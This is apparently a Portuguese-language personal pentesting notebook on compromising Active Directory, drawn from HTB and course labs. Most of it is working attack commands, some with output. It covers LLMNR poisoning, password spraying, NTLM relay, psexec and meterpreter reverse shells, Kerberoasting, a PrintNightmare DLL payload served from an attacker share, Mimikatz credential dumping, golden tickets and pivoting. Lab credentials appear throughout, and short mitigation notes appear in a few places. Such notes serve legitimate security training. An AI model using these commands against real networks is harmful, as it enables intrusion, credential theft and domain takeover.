# Active Directory

Atualizar o BloodHound e bloodhound.py para a ultima versão 

```
cd /opt/bloodhound/
sudo git init
sudo git remote add origin https://github.com/BloodHoundAD/BloodHound.git
sudo git pull origin master

cd /opt/BloodHound.py
sudo git clone https://github.com/BloodHoundAD/BloodHound.py.git
python3 bloodhound.py

krbrelayx
cd /opt/
sudo git clone https://github.com/dirkjanm/krbrelayx
```

[Kerberos](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Kerberos%2019e1fb7cfcae407ea4abfedc45f563d7.md)

[ldap](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/ldap%20994c1f78779d48539b16e6d06c25dbfb.md)

- LLMNR
    
    ```bash
    Um request LLMNR basicamente quando um computador usa credenciais para se conectar a uma pastas partilhada.
    
    Responde a um evento LLMNR
    Python [Responder.py](http://Responder.py) -l tun0 -rdw
    
    sudo responder -I eth0 -dwPv
    
    Hashcat -m 5600 hashes.txt /usr/share/wordlist/rockyou.txt -O
    ```
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled.png)
    
    Medidas para mitigar 
    
    - Desativar o LLMNR no computador;
    - Usar uma password grande (>14 caracteres) e com caracteres pouco previsiveis;
- Kerbrute
    
    `./kerbrute userenum --dc 10.129.95.154 -d intelligence.htb user.txt`
    
    `./kerbrute passwordspray --dc 10.129.95.154 -d intelligence.htb user.txt`
    
    `crackmapexec smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares -M spider_plus`
    
    ```
    ──╼ [★]$ crackmapexec smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares -M spider_plus
    [*] First time use detected
    [*] Creating home directory structure
    [*] Creating default workspace
    [*] Initializing FTP protocol database
    [*] Initializing MSSQL protocol database
    [*] Initializing WINRM protocol database
    [*] Initializing LDAP protocol database
    [*] Initializing RDP protocol database
    [*] Initializing SSH protocol database
    [*] Initializing SMB protocol database
    [*] Copying default configuration file
    [*] Generating SSL certificate
    SMB         10.129.95.154   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
    SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
    SPIDER_P... 10.129.95.154   445    DC               [*] Started spidering plus with option:
    SPIDER_P... 10.129.95.154   445    DC               [*]        DIR: ['print$']
    SPIDER_P... 10.129.95.154   445    DC               [*]        EXT: ['ico', 'lnk']
    SPIDER_P... 10.129.95.154   445    DC               [*]       SIZE: 51200
    SPIDER_P... 10.129.95.154   445    DC               [*]     OUTPUT: /tmp/cme_spider_plus
    SPIDER_P... 10.129.95.154   445    DC               [*] Reconnect to server 4
    SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
    SPIDER_P... 10.129.95.154   445    DC               [*] Reconnect to server 3
    SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
    SPIDER_P... 10.129.95.154   445    DC               [*] Reconnect to server 2
    SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
    SPIDER_P... 10.129.95.154   445    DC               [*] Reconnect to server 1
    SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
    SPIDER_P... 10.129.95.154   445    DC               [*] Reconnect to server 0
    SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
    ```
    
    `crackmapexec smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares --pass-pol`
    
    ```
    └──╼ [★]$ crackmapexec smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares --pass-pol
    SMB         10.129.95.154   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
    SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
    SMB         10.129.95.154   445    DC               [+] Enumerated shares
    SMB         10.129.95.154   445    DC               Share           Permissions     Remark
    SMB         10.129.95.154   445    DC               -----           -----------     ------
    SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
    SMB         10.129.95.154   445    DC               C$                              Default share
    SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
    SMB         10.129.95.154   445    DC               IT              READ            
    SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
    SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
    SMB         10.129.95.154   445    DC               Users           READ            
    SMB         10.129.95.154   445    DC               [+] Dumping password info for domain: intelligence
    SMB         10.129.95.154   445    DC               Minimum password length: 7
    SMB         10.129.95.154   445    DC               Password history length: None
    SMB         10.129.95.154   445    DC               Maximum password age: Not Set
    SMB         10.129.95.154   445    DC               
    SMB         10.129.95.154   445    DC               Password Complexity Flags: 000000
    SMB         10.129.95.154   445    DC               	Domain Refuse Password Change: 0
    SMB         10.129.95.154   445    DC               	Domain Password Store Cleartext: 0
    SMB         10.129.95.154   445    DC               	Domain Password Lockout Admins: 0
    SMB         10.129.95.154   445    DC               	Domain Password No Clear Change: 0
    SMB         10.129.95.154   445    DC               	Domain Password No Anon Change: 0
    SMB         10.129.95.154   445    DC               	Domain Password Complex: 0
    SMB         10.129.95.154   445    DC               
    SMB         10.129.95.154   445    DC               Minimum password age: None
    SMB         10.129.95.154   445    DC               Reset Account Lockout Counter: None
    SMB         10.129.95.154   445    DC               Locked Account Duration: None
    SMB         10.129.95.154   445    DC               Account Lockout Threshold: None
    SMB         10.129.95.154   445    DC               Forced Log off Time: Not Set
    ```
    
    Adicionar uma conta, a partir de uma existente 
    
    **`python3 dnstool.py -u 'intelligence\tiffany.molina' -p NewIntelligenceCorpUser9876  -r webipp.intelligence.htb -a add -t A -d 10.10.14.89 10.129.95.154`**
    
    ```
    **python3 dnstool.py -u 'intelligence\tiffany.molina' -p NewIntelligenceCorpUser9876  -r webipp.intelligence.htb -a add -t A -d 10.10.14.89 10.129.95.154
    [-] Connecting to host...
    [-] Binding to host
    [+] Bind OK
    [-] Adding new record
    [+] LDAP operation completed successfully**
    ```
    
- SMB Relay
    
    ```bash
    SMB Relay
    /etc/responder/Responder.conf
    
    Attack a ntlm
    ntlmrelayx.py -tf targets.txt -smb2support -i
    ntlmrelayx.py -tf targets.txt -smb2support -e test.exe
    ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
    ```
    
- Gaining Shell
    
    ```bash
    Metasploit
    msfconsole 
    search psexec 
    use windows/smb/psexec
    set rhosts 192.
    set smbdomain marvel.local
    set smbuser fcastle
    set smbpass Password
    set payload Windows/x64/meterpreter/reverse_tcp
    set LHOST eth0
    run
    set target 2
    
    psexec.py --help
    
    psexec.py marvel.local\fcastel:Password@192.168.57.141
    smbexec.py marvel.local\fcastel:Password@192.168.57.141
    wmiexec.py marvel.local\fcastel:Password@192.168.57.141
    
    ```
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%201.png)
    
- IPV6
    
    ```bash
    https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
    https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
    https://github.com/fortra/impacket/releases
    mitm6 -d marvel.local 
    ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad-marvel.local -l lootme
    
    Reiniciar o computador para acelarar o processo
    Login do computador
    
    firefox domain_user_by_group.html
    
    https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/
    
    ```
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%202.png)
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%203.png)
    
    Mitigação 
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%204.png)
    
- Post Compromise Enumeration
    
    ```bash
    sudo ldapdomaindump ldaps://192.168.138.136 -u 'MARVEL\fcastle' -p Password1
    
    sudo neo4j console
    sudo bloodhound 
    sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns 192.168.138.136 -c all
    
    ```
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%205.png)
    
- Passback
    
    ```bash
    https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
    ```
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%206.png)
    
    Pass Attack Mitigation 
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%207.png)
    
- Post Compromise Active Directory
    
    ```powershell
    
    powershell -ep bypass
    
    . .\Powerview.ps1
    https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
    Get-NetDomain
    Get-NetDomainController
    Get-DomainPolicy
    (Get-DomainPolicy)."System Access"
    Get-NetUser
    Get-NetUser | select cn
    Get-UserProperty -Properties pwdlastset
    Get-UserProperty 
    Get-NetComputer -FullData
    Get-NetGroup 
    Get-NetGroupMember 
    Invoke-ShareFinder
    Get-NetGPO | select displayname, whenchanged
    
    ```
    
- BloodHound
    
    ```powershell
    powershell -ep bypass
    
    . .\Sharphound.ps1
    Invoke-Bloodhound -CollectionMethod All - Domain Marvel.local -ZipFileName file.zip
    
    Attack Machine
    crackmapexec 10.10.10.10 -u fcastle -H asilufhkadsbv265dfgag --local
    crackmapexec smb 192.168.0.0/24 -u fcastle -d Marvel.local -p Password1
    
    pseexec.py 192.198.57.1 -facstle -d Marvel.local -p Password --sam
    
    pseexec.py marvel/fcastle:password@192.168.57.142
    
    ```
    
- Cracexec
    
    ```powershell
    Attack Machine
    crackmapexec 10.10.10.10 -u fcastle -H asilufhkadsbv265dfgag --local
    crackmapexec smb 192.168.0.0/24 -u fcastle -d Marvel.local -p Password1
    
    pseexec.py 192.198.57.1 -facstle -d Marvel.local -p Password --sam
    
    pseexec.py marvel/fcastle:password@192.168.57.142
    
    ```
    
- Hashdump
    
    ```bash
    secretsdump.py marvel/fcastle:password@192.168.57.12
    
    Identify the hash
    
    Crack the hash with hashcat
    hashcat64 .exe -m 1000 hash.txt rockyou.txt -O
    
    Selecionar a segunda parte da hash
    
    crackmapexec smb 192.168.0.0/24 -u "Frank Castle" -H <Hash> --local
    ```
    
- Kerberos
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%208.png)
    
    ```bash
    GetUserSPNs.py marvel.local/fcastle:password -dc-ip 192.168.57.140 -request
    ```
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%209.png)
    
    ```bash
    hashcat64.exe -m 13100 hachat.txt rockyou.txt -O
    ```
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%2010.png)
    
- User File Attack
    
    [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md#scf-and-url-file-attack-against-writeable-share](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)
    
    ```html
    [InternetShortcut]
    URL=blah
    WorkingDirectory=blah
    IconFile=\\x.x.x.x\%USERNAME%.icon
    IconIndex=1
    ```
    
- PrintNightmare
    
    ```bash
    rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
    pip3 uninstall impacket
    git clone https://github.com/cube0x0/impacket
    cd impacket
    python3 ./setup.py install
    
    smbserver.py share 'pwd' -smb2support
    msfvenon -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f dll > shell.dll
    
    python3 CVE-CVE-2021-1675.py marvel.local/fcastle:password@192.168.1.1 '\\192.168.1.1\share\shell.dll'
    ```
    
    [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
    
    [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)
    
- Mimikatz
    
    ```bash
    https://github.com/gentilkiwi/mimikatz
    mimikatz.exe
    mimikatz
    privilege::debug
    sekurlsa::logonpasswords
    lsadump::sam /patch
    lsadump::sam
    lsadump::lsa /patch
    ntds.dit
    
    ```
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%2011.png)
    
- Golden Tiket
    
    ```bash
    mimikatz.exe
    privilege::debug
    lsadump::lsa /inject /name:castle+
    kerberos::golden /User:Administrator /domain:marvel.local /sid: /krbtgt: /id:500 /ptt
    misc::cmd
    
    dir \\thepunisher\c$
    ```
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%2012.png)
    
- Pivoting
    
    ![Untitled](Active%20Directory%20621d0cabc91648de8dd02f0cd69d1b4d/Untitled%2013.png)
    
    ```bash
    metasploit
    use windows/smb/psexec
    set payload windows/x86
    set target 2
    
    Meterpreter
    shell 
    routeprint
    ipconfig
    arp -a
    ctrl+z
    run autoroute -s 10.10.10.0/24
    run autoroute -p
    background
    search portscan 
    use auxilary/scanner/portscan/tcp
    set rhosts
    set ports 
    run
    
    ```
    

Desemcriptar Active directory group passwords 

[gpp-decrypt | Kali Linux Tools](https://www.kali.org/tools/gpp-decrypt/)

Link uteis

[https://adsecurity.org/](https://adsecurity.org/)

[http://blog.harmj0y.net/](http://blog.harmj0y.net/)

[https://www.pentesteracademy.com/activedirectorylab](https://www.pentesteracademy.com/activedirectorylab)

[https://www.pentesteracademy.com/redteamlab](https://www.pentesteracademy.com/redteamlab)

Zerologon

[https://www.trendmicro.com/en_us/what-is/zerologon.html](https://www.trendmicro.com/en_us/what-is/zerologon.html)

[https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

[https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)